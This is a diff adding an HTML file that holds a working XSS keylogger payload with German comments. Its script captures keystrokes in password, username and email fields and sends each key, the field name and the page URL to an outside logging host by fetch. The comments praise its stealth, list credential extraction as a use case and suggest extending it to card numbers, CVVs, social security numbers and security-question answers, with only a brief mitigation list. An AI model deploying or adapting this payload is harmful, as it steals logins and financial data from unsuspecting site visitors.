@@ -1,0 +1,83 @@
+<!--
+XSS Keylogger - Targeted Keylogger (nur Password-Felder)
+Kleinere Payload-Größe, fokussiert auf sensitive Daten
+-->
+
+<script>
+(function() {
+    var sid = Math.random().toString(36).substr(2, 9);
+    var url = 'http://192.168.1.145:8889/log';
+
+    // Nur Password-Felder und Username-Felder
+    document.addEventListener('keypress', function(e) {
+        var fieldType = e.target.type;
+        var fieldName = e.target.name || e.target.id || 'unknown';
+
+        // Filter: Nur Password, Username, Email Felder
+        if (fieldType === 'password' ||
+            fieldName.toLowerCase().includes('password') ||
+            fieldName.toLowerCase().includes('username') ||
+            fieldName.toLowerCase().includes('email') ||
+            fieldName.toLowerCase().includes('pass')) {
+
+            // Sofortiges Senden (keine Buffer)
+            fetch(url + '?key=' + encodeURIComponent(e.key) +
+                      '&field=' + encodeURIComponent(fieldName) +
+                      '&page=' + encodeURIComponent(window.location.href) +
+                      '&sid=' + sid)
+                .catch(function(){});
+        }
+    });
+
+    // Backspace auch für Password-Felder
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+            var fieldType = e.target.type;
+            var fieldName = e.target.name || e.target.id || 'unknown';
+
+            if (fieldType === 'password' ||
+                fieldName.toLowerCase().includes('password')) {
+
+                fetch(url + '?key=Backspace&field=' + encodeURIComponent(fieldName) +
+                          '&sid=' + sid)
+                    .catch(function(){});
+            }
+        }
+    });
+})();
+</script>
+
+<!--
+Verwendung:
+Identisch zu keylogger_full.html, aber nur Password-Felder werden geloggt
+
+Vorteile:
+- Kleinere Payload-Größe (~50% kleiner)
+- Weniger Netzwerk-Traffic
+- Fokussiert auf sensitive Daten
+- Weniger auffällig (weniger Requests)
+
+Captured Fields:
+✅ type="password"
+✅ name/id contains "password"
+✅ name/id contains "username"
+✅ name/id contains "email"
+✅ name/id contains "pass"
+
+Use Cases:
+- Stealth Operations
+- Gezielte Credential-Extraction
+- Low-Bandwidth Environments
+- Wenn nur Passwords interessant sind
+
+Erweiterung:
+Füge weitere Keywords hinzu für targeting:
+- 'credit', 'card', 'cvv', 'pin'
+- 'ssn', 'social'
+- 'answer', 'question' (Security Questions)
+
+Mitigation:
+- Identisch zu Full Keylogger
+- Zusätzlich: Virtual Keyboard (Software Keyboard)
+- Anti-Keylogger Software
+-->
